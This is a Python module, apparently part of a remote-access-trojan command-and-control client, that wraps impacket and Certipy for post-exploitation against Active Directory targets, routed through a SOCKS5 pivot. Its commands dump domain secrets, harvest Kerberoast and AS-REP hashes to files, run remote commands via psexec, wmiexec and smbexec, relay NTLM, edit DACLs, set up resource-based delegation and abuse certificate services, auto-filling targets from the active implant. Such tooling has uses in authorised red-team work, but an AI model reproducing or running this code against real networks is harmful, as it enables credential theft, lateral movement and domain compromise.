"""PostMixin — operator-side post-exploitation via impacket and local tools.

All commands run on the Kali box against the target using credentials the operator
supplies. The active rat's host and domain are auto-filled as defaults.

Usage:
    post secretsdump [DOMAIN/user:pass@target]
    post kerberoast  [DOMAIN/user:pass@target]
    post asreproast  [DOMAIN/user@target]
    post psexec      [DOMAIN/user:pass@target] [cmd]
    post wmiexec     [DOMAIN/user:pass@target] [cmd]
    post smbexec     [DOMAIN/user:pass@target]
    post ntlmrelay   -t <target> [-smb2support] [extra args]
    post dacledit    [DOMAIN/user:pass@target] [args]
    post rbcd        [DOMAIN/user:pass@target] [args]
    post certipy     <sub-command> [args]
"""

import shlex
import subprocess
from pathlib import Path

from .ui import ok, err, info, warn, cyan, grey, print_output
from .api import rat_url, check


_IMPACKET_DIR = Path(__file__).parent.parent / "code_snippets" / "tools" / "original" / "python" / "impacket"

try:
    import importlib
    importlib.import_module("impacket")
    _HAS_IMPACKET_LIB = True
except ImportError:
    _HAS_IMPACKET_LIB = False


def _imp(script: str) -> str:
    """Return path to an impacket script, falling back to PATH."""
    if _HAS_IMPACKET_LIB:
        local = _IMPACKET_DIR / script
        if local.exists():
            return str(local)
    return script  # rely on $PATH (system impacket install)


def _write_proxychains_conf(port: int) -> Path:
    """Write a temp proxychains config pointing at the SOCKS5 proxy."""
    conf = Path(f"/tmp/thorn_proxychains_{port}.conf")
    conf.write_text(
        f"strict_chain\n"
        f"proxy_dns\n"
        f"tcp_read_time_out 15000\n"
        f"tcp_connect_time_out 8000\n"
        f"[ProxyList]\n"
        f"socks5 127.0.0.1 {port}\n"
    )
    return conf


def _run(cmd: list[str], timeout: int = 300, socks_port: int = None):
    """Run a local command, streaming output line-by-line.

    If socks_port is set, wraps the command with proxychains4.
    """
    if socks_port:
        conf = _write_proxychains_conf(socks_port)
        cmd = ["proxychains4", "-q", "-f", str(conf)] + cmd
        info(f"Routing through SOCKS5 proxy on :{socks_port}")

    info(f"  {grey('$')} {' '.join(cmd)}")
    print()
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        for line in proc.stdout:
            print(f"  {line}", end="")
        proc.wait(timeout=timeout)
        print()
        if proc.returncode == 0:
            ok("Done")
        else:
            warn(f"Exited with code {proc.returncode}")
    except FileNotFoundError as e:
        if socks_port and "proxychains" in str(e):
            err("proxychains4 not found — install: apt install proxychains4")
        else:
            err(f"Command not found: {e}")
    except subprocess.TimeoutExpired:
        proc.kill()
        warn("Timed out")
    except KeyboardInterrupt:
        proc.kill()
        info("Aborted")


class PostMixin:

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _socks_port(self):
        """Return the active SOCKS5 port, or None."""
        if getattr(self, '_socks5_task_id', None):
            return getattr(self, '_socks5_port', None)
        return None

    def _post_run(self, cmd: list[str], timeout: int = 300):
        """Run a post-ex command, auto-routing through SOCKS5 if active."""
        _run(cmd, timeout=timeout, socks_port=self._socks_port())

    def _rat_target(self):
        """Return (host, domain) from the active rat's info, or (None, None)."""
        if not self.active_rat:
            return None, None
        s, url = self._session()
        if not s:
            return None, None
        resp = check(s.get(rat_url(url, self.active_rat, "info")))
        if not resp:
            return None, None
        r = resp.json()
        return r.get("host"), r.get("domain")

    def _resolve_target(self, arg, need_creds=True):
        """Parse 'DOMAIN/user:pass@host' from arg, auto-filling from rat context if absent.

        Returns the resolved arg string, or None on error.
        If arg is already fully specified (contains '@'), return as-is.
        If arg is empty, prompt the operator for credentials and fill target from rat.
        """
        arg = arg.strip()
        if arg and "@" in arg:
            return arg  # fully specified — use as-is

        host, domain = self._rat_target()
        if not host:
            if not self.active_rat:
                err("No active rat — run: use <rat_id>")
            else:
                err("Could not fetch rat info")
            return None

        target = f"{domain}\\{host}" if domain else host

        if not arg and need_creds:
            info(f"Target: {cyan(host)}  Domain: {cyan(domain or '?')}")
            try:
                creds = input(f"  {grey('DOMAIN/user:pass')} » ").strip()
                print()
            except (EOFError, KeyboardInterrupt):
                print()
                return None
            if not creds:
                return None
            # creds is "DOMAIN/user:pass" — append @host
            return f"{creds}@{host}"
        elif arg:
            # arg is just "DOMAIN/user:pass" without @host
            return f"{arg}@{host}"
        else:
            return host

    # ── post dispatcher ───────────────────────────────────────────────────────

    def do_post(self, arg):
        """post <tool> [args]  —  Run impacket/local tools against active rat target

        Tools: secretsdump  kerberoast  asreproast  psexec  wmiexec  smbexec
               ntlmrelay  dacledit  rbcd  certipy
        """
        parts = arg.split(None, 1)
        if not parts:
            err("Usage: post <tool> [args]")
            info("Tools: secretsdump  kerberoast  asreproast  psexec  wmiexec  smbexec")
            info("       ntlmrelay  dacledit  rbcd  certipy")
            return

        tool    = parts[0].lower()
        rest    = parts[1] if len(parts) > 1 else ""
        handler = getattr(self, f"_post_{tool.replace('-', '_')}", None)
        if handler is None:
            err(f"Unknown tool '{tool}'")
            info("Tools: secretsdump  kerberoast  asreproast  psexec  wmiexec  smbexec")
            info("       ntlmrelay  dacledit  rbcd  certipy")
            return
        handler(rest)

    def complete_post(self, text, line, begidx, endidx):
        tools = ["secretsdump", "kerberoast", "asreproast", "psexec",
                 "wmiexec", "smbexec", "ntlmrelay", "dacledit", "rbcd", "certipy"]
        parts = line.split()
        if len(parts) == 1 or (len(parts) == 2 and not line.endswith(" ")):
            return [t for t in tools if t.startswith(text)]
        return []

    # ── secretsdump ───────────────────────────────────────────────────────────

    def _post_secretsdump(self, arg):
        """post secretsdump [DOMAIN/user:pass@target]  —  Dump secrets via impacket"""
        target = self._resolve_target(arg)
        if not target: return
        self._post_run(["python3", _imp("secretsdump.py"), target])

    # ── kerberoast ────────────────────────────────────────────────────────────

    def _post_kerberoast(self, arg):
        """post kerberoast [DOMAIN/user:pass@target] [-request]  —  GetUserSPNs kerberoast"""
        target = self._resolve_target(arg)
        if not target: return
        self._post_run(["python3", _imp("GetUserSPNs.py"), target, "-request", "-outputfile", "kerberoast_hashes.txt"])
        info("Hashes written to: kerberoast_hashes.txt")

    # ── asreproast ────────────────────────────────────────────────────────────

    def _post_asreproast(self, arg):
        """post asreproast [DOMAIN/user@target] [-no-pass]  —  GetNPUsers AS-REP roasting"""
        # asreproast doesn't need a password — accept "DOMAIN/user@host" or just host
        arg = arg.strip()
        if not arg or "@" not in arg:
            host, domain = self._rat_target()
            if not host:
                err("No active rat with resolvable host")
                return
            if not arg:
                info(f"Target: {cyan(host)}  Domain: {cyan(domain or '?')}")
                try:
                    user = input(f"  {grey('DOMAIN/user (no password needed)')} » ").strip()
                    print()
                except (EOFError, KeyboardInterrupt):
                    print()
                    return
                if not user:
                    return
                target = f"{user}@{host}"
            else:
                target = f"{arg}@{host}"
        else:
            target = arg
        self._post_run(["python3", _imp("GetNPUsers.py"), target, "-no-pass",
              "-format", "hashcat", "-outputfile", "asrep_hashes.txt"])
        info("Hashes written to: asrep_hashes.txt")

    # ── psexec ────────────────────────────────────────────────────────────────

    def _post_psexec(self, arg):
        """post psexec [DOMAIN/user:pass@target] [cmd]  —  psexec remote execution"""
        try:
            parts = shlex.split(arg)
        except ValueError:
            parts = arg.split()

        if parts and "@" in parts[0]:
            target = parts[0]
            cmd    = parts[1:] if len(parts) > 1 else []
        else:
            target = self._resolve_target(arg)
            if not target: return
            cmd = []

        self._post_run(["python3", _imp("psexec.py")] + ([target] + cmd if cmd else [target]))

    # ── wmiexec ───────────────────────────────────────────────────────────────

    def _post_wmiexec(self, arg):
        """post wmiexec [DOMAIN/user:pass@target] [cmd]  —  WMI remote execution"""
        try:
            parts = shlex.split(arg)
        except ValueError:
            parts = arg.split()

        if parts and "@" in parts[0]:
            target = parts[0]
            cmd    = parts[1:]
        else:
            target = self._resolve_target(arg)
            if not target: return
            cmd = []

        self._post_run(["python3", _imp("wmiexec.py")] + ([target] + cmd if cmd else [target]))

    # ── smbexec ───────────────────────────────────────────────────────────────

    def _post_smbexec(self, arg):
        """post smbexec [DOMAIN/user:pass@target]  —  SMB exec via service creation"""
        target = self._resolve_target(arg)
        if not target: return
        self._post_run(["python3", _imp("smbexec.py"), target])

    # ── ntlmrelay ─────────────────────────────────────────────────────────────

    def _post_ntlmrelay(self, arg):
        """post ntlmrelay -t <target> [-smb2support] [...]  —  ntlmrelayx"""
        if not arg.strip():
            err("Usage: post ntlmrelay -t <target> [-smb2support] [extra args]")
            return
        try:
            extra = shlex.split(arg)
        except ValueError:
            extra = arg.split()
        self._post_run(["python3", _imp("ntlmrelayx.py")] + extra)

    # ── dacledit ──────────────────────────────────────────────────────────────

    def _post_dacledit(self, arg):
        """post dacledit [DOMAIN/user:pass@target] [args]  —  DACL manipulation"""
        try:
            parts = shlex.split(arg)
        except ValueError:
            parts = arg.split()

        if parts and "@" in parts[0]:
            target  = parts[0]
            extra   = parts[1:]
            domain, rest = target.split("/", 1) if "/" in target else ("", target)
            user_host = rest.rsplit("@", 1)
            dc = user_host[1] if len(user_host) > 1 else ""
            self._post_run(["python3", _imp("dacledit.py"), "-action", "read",
                  "-dc-ip", dc, target] + extra)
        else:
            target = self._resolve_target(arg)
            if not target: return
            host, _ = self._rat_target()
            self._post_run(["python3", _imp("dacledit.py"), "-action", "read",
                  "-dc-ip", host or "", target] + parts)

    # ── rbcd ──────────────────────────────────────────────────────────────────

    def _post_rbcd(self, arg):
        """post rbcd [DOMAIN/user:pass@target] [args]  —  Resource-based constrained delegation"""
        try:
            parts = shlex.split(arg)
        except ValueError:
            parts = arg.split()

        if parts and "@" in parts[0]:
            target = parts[0]
            extra  = parts[1:]
        else:
            target = self._resolve_target(arg)
            if not target: return
            extra  = []

        self._post_run(["python3", _imp("rbcd.py")] + [target] + extra)

    # ── certipy ───────────────────────────────────────────────────────────────

    def _post_certipy(self, arg):
        """post certipy <sub-command> [args]  —  AD CS abuse via certipy"""
        arg = arg.strip()
        if not arg:
            host, domain = self._rat_target()
            info("Usage: post certipy <find|req|auth|shadow|...> [args]")
            if host:
                info(f"  Detected target: {cyan(host)}  domain: {cyan(domain or '?')}")
            return

        try:
            extra = shlex.split(arg)
        except ValueError:
            extra = arg.split()

        # Try bundled Certipy.exe via wine, then fall back to system certipy
        certipy_exe = Path(__file__).parent.parent / "code_snippets" / "tools" / "original" / "exe" / "Certipy.exe"
        if certipy_exe.exists():
            self._post_run(["wine", str(certipy_exe)] + extra)
        else:
            self._post_run(["certipy"] + extra)
